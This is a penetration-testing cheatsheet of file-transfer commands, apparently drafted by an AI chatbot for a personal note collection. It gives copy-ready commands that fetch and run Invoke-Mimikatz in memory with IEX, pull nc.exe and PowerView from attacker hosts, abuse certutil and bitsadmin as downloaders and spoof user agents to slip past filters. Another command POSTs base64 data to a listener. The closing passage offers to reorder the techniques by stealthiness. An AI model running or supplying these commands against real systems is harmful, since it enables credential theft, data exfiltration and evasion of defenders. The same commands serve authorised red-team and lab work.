
2025-10-10 20:04

Status:

Tags: [[cheatsheet]],[[files]]


# File Transfer Cheatsheet


A clean, copy-friendly cheatsheet grouped by platform / technique. Copy the command blocks below directly into a terminal or PowerShell prompt.

---

## PowerShell — download / execute / in-memory

| Command                                                                                                            | Description                                                                            |
| ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell to the current directory.                              |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Download a remote script and execute it in memory (`IEX` = Invoke-Expression).         |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Send a POST with body `$b64` (upload content to a listening HTTP server).              |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Download while setting the User-Agent header (useful for bypassing simple UA filters). |

### Copyable blocks

```powershell
# Download a file to disk
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1

# Execute a remote script in memory
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')

# POST a base64 body to an endpoint (upload)
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64

# Download with a custom User-Agent
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```

---

## Windows — alternate download utilities

|Command|Description|
|---|---|
|`bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`|Download a file using `bitsadmin` (Background Intelligent Transfer Service).|
|`certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`|Use `certutil` to download a file (abuses the certificate tool).|

### Copyable blocks

```powershell
# Download using bitsadmin (saves to C:\Temp\nc.exe)
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

# Download using certutil
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

---

## Linux / macOS — wget / curl / scp / php

|Command|Description|
|---|---|
|`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`|Download a file with `wget` to `/tmp`.|
|`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`|Download a file with `curl` to `/tmp`.|
|`php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`|Download a file using an inline PHP one-liner.|
|`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`|Upload a local Windows file to a remote host using `scp`.|
|`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`|Download a remote file from `target` to local Windows path using `scp`.|

### Copyable blocks

```bash
# wget download to /tmp
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# curl download to /tmp
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# PHP one-liner to download a file
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```bash
# SCP upload (local -> remote)
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip

# SCP download (remote -> local)
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

---

## Quick tips & cautions

- Replace `http://` / `https://` and `<snip>` with the actual host/URI before running.
    
- When executing remote scripts (`IEX`, `DownloadString`, `Invoke-Expression`) you are running code from the network — **only do this in trusted/test environments**.
    
- `bitsadmin` and `certutil` are often monitored or restricted by defenders; behavior may alert EDR.
    
- `scp` requires SSH access/credentials and will prompt for password unless keys are configured.
    
- Use full paths (e.g., `C:\Temp\nc.exe`) to avoid ambiguity in where files land.
    
- For PowerShell v3+ prefer `Invoke-WebRequest` / `Invoke-RestMethod` over legacy `WebClient` where possible.
    

---

If you want, I can:

- produce a one-page printable Markdown file (or PDF) from this,
    
- reorder by stealthiness (quiet → noisy),
    
- or add Windows vs Linux badges and examples for using `curl` through PowerShell (where `curl` may be an alias). Which would you like?



# References
